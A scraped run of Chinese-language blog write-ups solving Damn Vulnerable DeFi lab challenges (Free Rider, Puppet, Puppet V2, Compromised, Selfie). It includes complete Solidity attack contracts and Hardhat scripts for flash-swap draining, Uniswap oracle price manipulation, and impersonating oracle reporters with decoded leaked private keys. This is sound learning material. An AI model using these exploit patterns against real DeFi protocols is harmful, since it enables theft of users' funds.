(uint amount0Out, uint amount1Out) = address(token) &gt; address(weth) ? (uint(15 ether), uint(0 ether)) :(uint(0 ether), uint(15 ether)); uniswapPair.swap( amount0Out, amount1Out, address(this), abi.encodeWithSignature(&quot;buyMany(uint256[])&quot;, tokens)); /** 此时 hacker 成为了 tokens 的拥有者, 且不欠 uniswapPair的钱 */ // 兑换赏金 for (uint256 i = 0; i &lt; tokens.length; i++) &#123; nft.safeTransferFrom( address(this), address(recovery), tokens[i], // 此处为了呼应 payable(abi.decode(_data, (address))).sendValue(PRIZE); abi.encode(msg.sender)); &#125; &#125; function uniswapV2Call(address, uint , uint , bytes calldata data) external &#123; // 记录hacker手中的ETH --- 15 ether uint amountETH = weth.balanceOf(address(this)); // 将WETH换成ETH weth.withdraw(amountETH); // 调用 buyMany 函数 address(marketplace).call&#123;value: amountETH&#125;(data); // 将手中的 ETH换成WETH, 并还回去 // woc 这里还要支付 0.3% 的手续费！！！ 也就是 0.045 uint repayAmount = amountETH * 1004 / 1000; weth.deposit&#123;value: repayAmount&#125;(); weth.transfer(address(uniswapPair), repayAmount); &#125; function onERC721Received( address , address , uint256 , bytes calldata ) external returns (bytes4)&#123; return IERC721Receiver.onERC721Received.selector; &#125; receive() external payable &#123;&#125;&#125; 这里我不知道为什么支付 0.3%的手续费不行，得需要支付更多才行 我选择了支付 0.4% uint repayAmount = amountETH * 1004 / 1000; 3.2 challenge.js123456789101112it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const hacker = await (await ethers.getContractFactory(&quot;FreeRiderHack&quot;, player)).deploy( uniswapPair.address, token.address, weth.address, nft.address, marketplace.address, devsContract.address ); await hacker.attack();&#125;); 解题成功。","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"damn defi","slug":"Smart-contracts/damn-defi","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Puppet V2","slug":"Smart contracts/damn defi/Puppet V2","date":"2023-07-14T07:37:10.000Z","updated":"2023-07-14T07:37:10.000Z","comments":true,"path":"2023/07/14/Smart contracts/damn defi/Puppet V2/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/14/Smart%20contracts/damn%20defi/Puppet%20V2/","excerpt":"","text":"1. issue The developers of the previous pool seem to have learned the lesson. And released a new version! Now they’re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough. You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance. You know what to do. 要求：通过手中的 20 ETH 和 10000 DVT ，将池中的 100万个 DVT 代币取出来。 题目链接 2. analysing做这题是要求对 uniswap v2有一定的了解才行。 2.1 PuppetV2Pool.sol代码的分析如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384// SPDX-License-Identifier: MITpragma solidity ^0.6.0; import &quot;@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol&quot;;import &quot;@uniswap/v2-periphery/contracts/libraries/SafeMath.sol&quot;;interface IERC20 &#123; function transfer(address to, uint256 amount) external returns (bool); function transferFrom(address from, address to, uint256 amount) external returns (bool); function balanceOf(address account) external returns (uint256);&#125;/** * @title PuppetV2Pool * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz) */contract PuppetV2Pool &#123; using SafeMath for uint256; address private _uniswapPair; address private _uniswapFactory; IERC20 private _token; IERC20 private _weth; mapping(address =&gt; uint256) public deposits; event Borrowed(address indexed borrower, uint256 depositRequired, uint256 borrowAmount, uint256 timestamp); constructor(address wethAddress, address tokenAddress, address uniswapPairAddress, address uniswapFactoryAddress) public &#123; _weth = IERC20(wethAddress); _token = IERC20(tokenAddress); _uniswapPair = uniswapPairAddress; _uniswapFactory = uniswapFactoryAddress; &#125; /** * @notice Allows borrowing tokens by first depositing three times their value in WETH * Sender must have approved enough WETH in advance. * Calculations assume that WETH and borrowed token have same amount of decimals. */ function borrow(uint256 borrowAmount) external &#123; // Calculate how much WETH the user must deposit // 借 WETH 的押金 amount = borrowAmount * 10 ^ 18 * reservesWETH / reservesToken uint256 amount = calculateDepositOfWETHRequired(borrowAmount); // Take the WETH _weth.transferFrom(msg.sender, address(this), amount); // internal accounting deposits[msg.sender] += amount; require(_token.transfer(msg.sender, borrowAmount), &quot;Transfer failed&quot;); emit Borrowed(msg.sender, amount, borrowAmount, block.timestamp); &#125; function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) &#123; uint256 depositFactor = 3; return _getOracleQuote(tokenAmount).mul(depositFactor) / (1 ether); &#125; // Fetch the price from Uniswap v2 using the official libraries function _getOracleQuote(uint256 amount) private view returns (uint256) &#123; /** 1. address(_weth), address(_token) 不能相同 2. getReserves() 该函数的作用就是为了求出在 uniswap中各自对应的存储量 */ (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(_uniswapFactory, address(_weth), address(_token)); /** 1. amount 要求大于 0 2. reservesToken，reservesWETH 也要求大于0，也就是说要求在 uniswapv2中还有储备量 3. quote的计算源码： `amountA.mul(reserveB) / reserveA;` 3.1 代入本题：amount.mul(10 ** 18).mul(reservesWETH) / reservesToken 3.2 化简：amount * 10 ^ 18 * reservesWETH / reservesToken */ return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH); &#125;&#125; 简单的分析，发现和上一题大差不差。 押金 = borrowAmount * 10 ^ 18 * reservesWETH / reservesToken 其中的押金是由 reservesWETH 和 reservesToken 决定的，要么改变 reservesWETH 要么 改变 reservesToken，本题是改变 reservesWETH 。 题中已经给我们的 token 和 weth交易对注入一定的金额了 12const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n;const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n; 我们的任务就是将 UNISWAP_INITIAL_WETH_RESERVE的值尽可能的变小，我们可以通过UniswapV2Router02合约的 swapExactTokensForETH函数，将player全部的token在 交易对中尽可能的兑换多的WETH出来，从而降低我们的押金。 解题思路： 先通过 UniswapV2Router02 中的 swapExactTokensForETH消耗调 uniswapExchange中的 WETH 调用borrow函数 将hacker中的tokens转回player 3. solving3.1 PuppetV2Hack.sol123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990// SPDX-License-Identifier: MITpragma solidity ^0.6.0; import &#x27;@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol&#x27;;import &#x27;@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol&#x27;;import &#123;PuppetV2Pool&#125; from &quot;./PuppetV2Pool.sol&quot;;import &quot;hardhat/console.sol&quot;;interface IERC20 &#123; function deposit() external payable; function approve(address spender, uint256 amount) external returns (bool); function balanceOf(address account) external returns (uint256); function transfer(address to, uint256 amount) external returns (bool); function transferFrom( address from, address to, uint256 amount ) external returns (bool);&#125;/** 解题思路： 1. 先通过 UniswapV2Router02 中的 `swapExactTokensForETH`消耗调 uniswapExchange中的 WETH 1.1 player给hacker转入tokens 1.2 hacker给uniswapRouter授权 ---&gt; safeTransferFrom 1.3 根据token和weth创建一个数组 2. 调用borrow函数 2.1 将player的ETH转发给hacker 2.2 让hacker给pool授权，以此调用pool中的 transferFrom 2.3 调用borrow函数 2.4 将tokens转移到player */contract PuppetV2Hack &#123; IUniswapV2Router02 uniswapRouter; IERC20 token; PuppetV2Pool pool; IERC20 weth; address player; constructor( address _uniswapRouter, address _token, address _pool, address _weth) public &#123; uniswapRouter = IUniswapV2Router02(_uniswapRouter); token = IERC20(_token); pool = PuppetV2Pool(_pool); weth = IERC20(_weth); player = msg.sender; &#125; function attack() external payable &#123; // 获取player的token数量 uint256 tokenAmount = token.balanceOf(address(this)); token.approve(address(uniswapRouter), tokenAmount); // 创建数组 address[] memory path = new address[](2); path[0] = address(token); path[1] = address(weth); uniswapRouter.swapExactTokensForETH( tokenAmount, 1, path, address(this), uint256(block.timestamp + 150) ); // ETH 转 WETH weth.deposit&#123;value: address(this).balance&#125;(); // hacker给pool授权 weth.approve(address(pool), weth.balanceOf(address(this))); // 调用borrow函数 pool.borrow(token.balanceOf(address(pool))); // 将token转给token token.transfer(player, token.balanceOf(address(this))); &#125; // 涉及到转ETH的必须需要有这个接收函数 receive() external payable &#123;&#125;&#125; 3.2 challenge.js123456789it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const hacker = await (await ethers.getContractFactory(&#x27;PuppetV2Hack&#x27;, player)).deploy( uniswapRouter.address, token.address, lendingPool.address, weth.address ); await (await token.connect(player)).transfer(hacker.address, PLAYER_INITIAL_TOKEN_BALANCE); // 这里减掉 0.1ether是为了保证交易正常进行，支付交易所需的gas await hacker.attack(&#123;value: PLAYER_INITIAL_ETH_BALANCE - 1n * 10n ** 17n&#125;); &#125;); ![image-20230721232602837](Puppet V2&#x2F;image-20230721232602837.png) 解题成功。","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"damn defi","slug":"Smart-contracts/damn-defi","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Puppet","slug":"Smart contracts/damn defi/Puppet","date":"2023-07-13T11:37:10.000Z","updated":"2023-07-13T11:37:10.000Z","comments":true,"path":"2023/07/13/Smart contracts/damn defi/Puppet/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/13/Smart%20contracts/damn%20defi/Puppet/","excerpt":"","text":"1. issue There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity. There’s a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity. Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance. 简单来说，凭借手中 25 ETH and 1000 DVTs，将 lending pool中的 DVTS 代币全部取出来。 题目链接 2. analysing2.1 PuppetPool.sol这道题只有一个合约，我们先阅读合约。 里面只有三个函数， 分别是： borrow、calculateDepositRequired、_computeOraclePrice borrow 123456789101112131415161718192021222324function borrow(uint256 amount, address recipient) external payable nonReentrant &#123; uint256 depositRequired = calculateDepositRequired(amount); // 押金 （DVT) if (msg.value &lt; depositRequired) revert NotEnoughCollateral(); if (msg.value &gt; depositRequired) &#123; // 支付的ETH 要大于押金 unchecked &#123; payable(msg.sender).sendValue(msg.value - depositRequired); &#125; &#125; unchecked &#123; deposits[msg.sender] += depositRequired; &#125; // Fails if the pool doesn&#x27;t have enough tokens in liquidity if(!token.transfer(recipient, amount)) revert TransferFailed(); emit Borrowed(msg.sender, recipient, depositRequired, amount); &#125; 函数很简单，就是 判断你支付的ETH 要大于押金，而且还有确保 pool中有足够的 DVTs可供借贷 if(!token.transfer(recipient, amount))。 calculateDepositRequired、_computeOraclePrice 这两个函数一块看 1234567891011// 计算押金 化简得 2 * amount * uniswapPair.balance / token.balanceOf(uniswapPair) function (uint256 amount) public view returns (uint256) &#123; return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18; &#125; // 计算每一个 token 对应多少 wei function _computeOraclePrice() private view returns (uint256) &#123; // calculates the price of the token in wei according to Uniswap pair return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair); &#125; 将这两个函数，利用数学代换式可以将 calculateDepositRequired的计算式看成 depositRequired = 2 * uniswapPair.balance / token.balanceOf(uniswapPair) 我们都知道，要想商最小，要么被除数越小，要么除数越大。 而题中 uniswapPair.balance 和 token.balanceOf(uniswapPair)都是 10 。题目还为我们提供了一个 uniswap v1我 手中有 25 ETH and 1000 DVTs，我可以试着和 uniswap进行交换，从而看看如何改变uniswap 的 uniswapPair.balance 或 token.balanceOf(uniswapPair)。 有一篇 文章能够帮助我们调用 uniswap v1的函数，比如 tokenToEthSwapOutput，函数功能：指定你需要兑换的 ETH数量并将ETH发送给指定接收者，函数根据要兑换的ETH计算扣除代币。 大佬的博客 3. solving3.1 PuppetHack.sol1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;../DamnValuableToken.sol&quot;;import &quot;./PuppetPool.sol&quot;;import &quot;hardhat/console.sol&quot;;interface IUniswapExchange &#123; function tokenToEthSwapOutput(uint256 eth_bought, uint256 max_tokens, uint256 deadline) external returns (uint256);&#125;contract PuppetHack &#123; DamnValuableToken token; IUniswapExchange uniswapExchange; PuppetPool pool; constructor(address _token, address _uniswapExchange, address _pool) &#123; token = DamnValuableToken(_token); uniswapExchange = IUniswapExchange(_uniswapExchange); pool = PuppetPool(_pool); &#125; function attack() external payable &#123; // console.log(&quot;msg.sender.balance&quot;,msg.sender.balance); // payable(address(this)).transfer(msg.sender.balance); // 记录我手中的代币数量 uint256 amount = token.balanceOf(address(this)); // 先给uniswapv1授权，允许它调用我们全部的token，此时授权者是hacker token.approve(address(uniswapExchange), amount); // 调用v1，用代币交换ETH uniswapExchange.tokenToEthSwapOutput(9.9 ether, amount, block.timestamp * 2); // 算一下现在把 pool中的token全部借出来要抵押多少 ETH uint256 depositRequired = pool.calculateDepositRequired(token.balanceOf(address(pool))); // 将全部的 token代币借出来 pool.borrow&#123;value: depositRequired, gas: 30000000&#125;(token.balanceOf(address(pool)), msg.sender); &#125; // 接收 v1 换出来的 ETH receive() external payable &#123;&#125;&#125; 3.2 challenge.js1234567891011121314it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const hacker = await (await ethers.getContractFactory(&#x27;PuppetHack&#x27;, player)).deploy( token.address, uniswapExchange.address, lendingPool.address); await token.connect(player).transfer(hacker.address, await token.balanceOf(player.address)); await player.sendTransaction(&#123; to: hacker.address, value: await ethers.utils.parseEther(&quot;11.0&quot;) &#125;); await hacker.attack(); &#125;); 要在一笔交易中完成。。。。。。(把题目改了就舒服多了) 先留着吧，等以后技术上来了，再试着把他们整合到一笔交易中。","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"damn defi","slug":"Smart-contracts/damn-defi","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"From ASCII To  PrivateKey","slug":"Solidity/Utils/ASCII转私钥","date":"2023-07-13T04:47:10.000Z","updated":"2023-07-13T04:47:10.000Z","comments":true,"path":"2023/07/13/Solidity/Utils/ASCII转私钥/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/13/Solidity/Utils/ASCII%E8%BD%AC%E7%A7%81%E9%92%A5/","excerpt":"","text":"1. 前言主要是在 靶场 刷题的时候遇到的，题目要求 将一串ASCII码转为字符串，再将字符串解码为一串私钥。感觉很有趣，于是乎，便记录下来。 2. 题目一串已知的ASCII码 14d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35 3. 解法（JavaScript） 思路： 将其看作字符串，将字符串以空格为界限分割为数组，遍历数组，将数组中的每一个元素拼接一个 0x为了将其转为整型的时候代表着 16进制。最后将数组挨个遍历转化拼接。 实现代码 12345678910let code = &quot;4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35&quot;;let chars = code.split(&quot; &quot;)let result = &quot;&quot;;for (let i = 0; i &lt; chars.length; i++) &#123; chars[i] = &quot;0x&quot; + chars[i]; chars[i] = String.fromCharCode(parseInt(chars[i])); result += chars[i];&#125;result = atob(result);console.log(result);","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"PrivateKey","slug":"PrivateKey","permalink":"https://biyouqiuqiu.com/tags/PrivateKey/"},{"name":"ASCII","slug":"ASCII","permalink":"https://biyouqiuqiu.com/tags/ASCII/"}]},{"title":"Compromised","slug":"Smart contracts/damn defi/Compromised","date":"2023-07-13T03:37:10.000Z","updated":"2023-07-13T03:37:10.000Z","comments":true,"path":"2023/07/13/Smart contracts/damn defi/Compromised/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/13/Smart%20contracts/damn%20defi/Compromised/","excerpt":"","text":"1. issue While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. Here’s a snippet: 123456789HTTP/2 200 OKcontent-type: text/htmlcontent-language: envary: Accept-Encodingserver: cloudflare4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 354d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34 A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each. This price is fetched from an on-chain oracle, based on 3 trusted reporters: 0xA732...A105,0xe924...9D15 and 0x81A5...850c. Starting with just 0.1 ETH in balance, pass the challenge by obtaining all ETH available in the exchange. 目标：使用你手中的 0.1 ether 去掏空 交易所中的 所有ETH 题目链接 2. analysing2.1 understanding of me通读整个代码之后，理解了预言机及交易所的工作原理。我能想到的就是通过 postPrice修改货币的价格，使其售价低于我们手中的余额 0.1 ETH。但是，成为 TRUSTED_SOURCE_ROLE成为了难点。 1234// 修改 msg.sender 自己的货币价格 function postPrice(string calldata symbol, uint256 newPrice) external onlyRole(TRUSTED_SOURCE_ROLE) &#123; _setPrice(msg.sender, symbol, newPrice);&#125; 还有一个修改售价的函数 setupInitialPrices，但是他的权限在 INITIALIZER_ROLE他手里，而拥有这个权力的人只有部署者有，就本题来说 拥有该权力的是 deployer 而我们作为 player我们必然没有权力去调用这个函数。到此我就开始陷入迷茫了。。。。。要么等 deployer 修改价格，要么等 卖家自己降价。 123456789101112131415function setupInitialPrices(address[] calldata sources, string[] calldata symbols, uint256[] calldata prices) external onlyRole(INITIALIZER_ROLE)&#123; // Only allow one (symbol, price) per source require(sources.length == symbols.length &amp;&amp; symbols.length == prices.length); // 确保每个地址对应一种货币 for (uint256 i = 0; i &lt; sources.length;) &#123; unchecked &#123; _setPrice(sources[i], symbols[i], prices[i]); // 给 sources[i] =&gt; symbols[i] 设置一个新的价格 prices[i] ++i; &#125; &#125; renounceRole(INITIALIZER_ROLE, msg.sender); // 执行完 初始化价格操作之后，将回收调用者的 INITIALIZER_ROLE 角色权力&#125; 2.2 search for help最后还是去网上搜了 题解 看完之后我只能说，牛的。。。。确实没注意审题，但是谁知道题目给的信息可以转为 EOA账户的私钥哇😅 转换链接 我将 转换出来的两个私钥通过 一些 手段 转成地址，发现和题目中的后两个地址一样。 也就是说我们可以冒充 &#39;0xe92401A4d3af5E446d93D11EEc806b1462b39D15&#39; &#39;0x81A5D6E50C214044bE44cA0CB057fe119097850c&#39; 。 于是就有了解题思路： 先将题目给的信息转成私钥 冒充卖家，通过 postPrice函数将自己货币价格改得很低 玩家player立即低价购买 冒充卖家，通过 postPrice函数将自己货币价格改为交易所现有ETH数目的价格 玩家player出售自己购买的货币 冒充卖家，通过 postPrice函数将自己货币价格改为 EXCHANGE_INITIAL_ETH_BALANCE 3. solving3.1 challenge.js12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ let code1 = &quot;4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35&quot;; let code2 = &quot;4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34&quot;; let chars1= code1.split(&quot; &quot;); let chars2 = code2.split(&quot; &quot;); let privateKey2 = &quot;&quot;; let privateKey3 = &quot;&quot;; for (let i = 0; i &lt; chars1.length; i++) &#123; chars1[i] = &quot;0x&quot; + chars1[i]; chars1[i] = String.fromCharCode(parseInt(chars1[i])); privateKey2 += chars1[i]; &#125; for (let i = 0; i &lt; chars2.length; i++) &#123; chars2[i] = &quot;0x&quot; + chars2[i]; chars2[i] = String.fromCharCode(parseInt(chars2[i])); privateKey3 += chars2[i]; &#125; privateKey2 = atob(privateKey2); privateKey3 = atob(privateKey3); let accountWallet2 = new ethers.Wallet(privateKey2, ethers.provider); let accountWallet3 = new ethers.Wallet(privateKey3, ethers.provider); // 修改oracle的msg.sender,分别将各自的货币价格设置为 1wei await oracle.connect(accountWallet2).postPrice(&#x27;DVNFT&#x27;, 1) await oracle.connect(accountWallet3).postPrice(&#x27;DVNFT&#x27;, 1) await exchange.connect(player).buyOne(&#123; value: 1, &#125;); // 交易所中现有的 ETH const newPrice = await ethers.provider.getBalance(exchange.address) // 修改oracle的msg.sender,分别将各自的货币价格设置为 newPrice await oracle.connect(accountWallet2).postPrice(&#x27;DVNFT&#x27;,newPrice) await oracle.connect(accountWallet3).postPrice(&#x27;DVNFT&#x27;,newPrice) /** * approve 操作为了成功执行 `token.transferFrom(msg.sender, address(this), id)` 允许 exchange.address可以调用 player的钱、 至于为什么是 `0`号代币，是因为在DamnValuableNFT中 &#x27;DVNFT&#x27; 是唯一一种 id 是根据 ` function safeMint(address to) public onlyRoles(MINTER_ROLE) returns (uint256 tokenId)`求的 */ await nftToken.connect(player).approve(exchange.address, 0) await exchange.connect(player).sellOne(0); // 将售价改回 EXCHANGE_INITIAL_ETH_BALANCE await oracle.connect(accountWallet2).postPrice(&#x27;DVNFT&#x27;,EXCHANGE_INITIAL_ETH_BALANCE) await oracle.connect(accountWallet3).postPrice(&#x27;DVNFT&#x27;,EXCHANGE_INITIAL_ETH_BALANCE) &#125;); 本题给我的启发：私钥很重要，一定要好好保管自己的私钥。还有做题的时候一定要好好看题再开始做题。","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"damn defi","slug":"Smart-contracts/damn-defi","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Selfie","slug":"Smart contracts/damn defi/Selfie","date":"2023-07-12T02:37:10.000Z","updated":"2023-07-12T02:37:10.000Z","comments":true,"path":"2023/07/12/Smart contracts/damn defi/Selfie/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/12/Smart%20contracts/damn%20defi/Selfie/","excerpt":"","text":"1. issue A new cool lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it. What could go wrong, right ? You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all. 目标：将 A new cool lending pool的钱全取出来。 题目链接 2. analysing2.1 SelfPool.solflashLoan 123456789101112131415161718192021222324function flashLoan( IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data) external nonReentrant returns (bool) &#123; // 保证 _token 为该合约的ERC20Snapshot地址 if (_token != address(token)) revert UnsupportedCurrency(); // 金库 向借贷者转账 token.transfer(address(_receiver), _amount); // _receiver 需要具备换贷功能，且返回值必须是 CALLBACK_SUCCESS // 此时 msg.sender = hacker if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) revert CallbackFailed(); if (!token.transferFrom(address(_receiver), address(this), _amount)) revert RepayFailed(); return true;&#125; 借贷函数，要求我们实现onFlashLoan函数，且按要求返回 CALLBACK_SUCCESS 然后再还清贷款，这里八分要涉及授权问题。 emergencyExit 12345678910// 紧急事件出口// 但是能操作这个函数的只有 该合约的管理者行function emergencyExit(address receiver) external onlyGovernance &#123; // 记录当前合约的余额 uint256 amount = token.balanceOf(address(this)); // 调用者将 amount 转给 receiver token.transfer(receiver, amount); emit FundsDrained(receiver, amount);&#125; 解题关键： 我们要通过 governance之手，将 借贷池的钱全部转移到我（player）的账户下。 重点就是如果借 governance之手，我们再看看 governance的合约。 SimpleGovernance 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;../DamnValuableTokenSnapshot.sol&quot;;import &quot;./ISimpleGovernance.sol&quot;;// import &quot;hardhat/console.sol&quot;;/** * @title SimpleGovernance * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz) */contract SimpleGovernance is ISimpleGovernance &#123; uint256 private constant ACTION_DELAY_IN_SECONDS = 2 days; DamnValuableTokenSnapshot private _governanceToken; // 治理代币 =&gt; 一种新型的代币拥有快照功能 uint256 private _actionCounter; // 动作计数器 mapping(uint256 =&gt; GovernanceAction) private _actions; // GovernanceAction 是 ISimpleGovernance 中的一个结构体 /** governanceToken 继承了 ERC20 拥有ERC20 协议的功能 */ constructor(address governanceToken) &#123; _governanceToken = DamnValuableTokenSnapshot(governanceToken); _actionCounter = 1; // 初始化动作行为次数 = 1 &#125; /** 排队行为 */ function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) &#123; // 判断是否有票 if (!_hasEnoughVotes(msg.sender)) revert NotEnoughVotes(msg.sender); // target 不能为当前合约 if (target == address(this)) revert InvalidTarget(); // data 需为 空，且 target.code.length 字节码不能为空，也就是说当前target需要正确部署到区块链上 if (data.length &gt; 0 &amp;&amp; target.code.length == 0) revert TargetMustHaveCode(); // 行为ID = 合约中的行为次数 actionId = _actionCounter; // 记录该行为的信息 _actions[actionId] = GovernanceAction(&#123; target: target, value: value, proposedAt: uint64(block.timestamp), executedAt: 0, data: data &#125;); // 行为次数加一 unchecked &#123; _actionCounter++; &#125; emit ActionQueued(actionId, msg.sender); &#125; /** 是否有足够的票 */ function _hasEnoughVotes(address who) private view returns (bool) &#123; /** 注意： 这里要注意的是，totalsupply 只受 铸币和销币的操作的影响 而balance既 受 铸币和销币的操作的影响 也受 转账操作的影响 所以在不执行burn操作的前提下，只要一铸币，在整体合约体系中 totalsupply是不变的 */ // 查看 who 在上次快照的时候的 balance uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who); // console.log(who,balance); // 查看 who 在上次快照的时候的 总供给量 的一半 uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2; // 如果 余额大于 一半供给量就是有票 return balance &gt; halfTotalSupply; &#125; /** 执行行为 */ function executeAction(uint256 actionId) external payable returns (bytes memory) &#123; // 是否满足执行条件 if(!_canBeExecuted(actionId)) revert CannotExecute(actionId); // 获取 该actionId 的 结构体 // `storage`我感觉要值得注意 GovernanceAction storage actionToExecute = _actions[actionId]; // 修改executedAt， 表示该actionId 进行了 执行行为 actionToExecute.executedAt = uint64(block.timestamp); emit ActionExecuted(actionId, msg.sender); // target 调用 actionToExecute.data 函数 (bool success, bytes memory returndata) = actionToExecute.target.call&#123;value: actionToExecute.value&#125;(actionToExecute.data); if (!success) &#123; if (returndata.length &gt; 0) &#123; assembly &#123; revert(add(0x20, returndata), mload(returndata)) &#125; 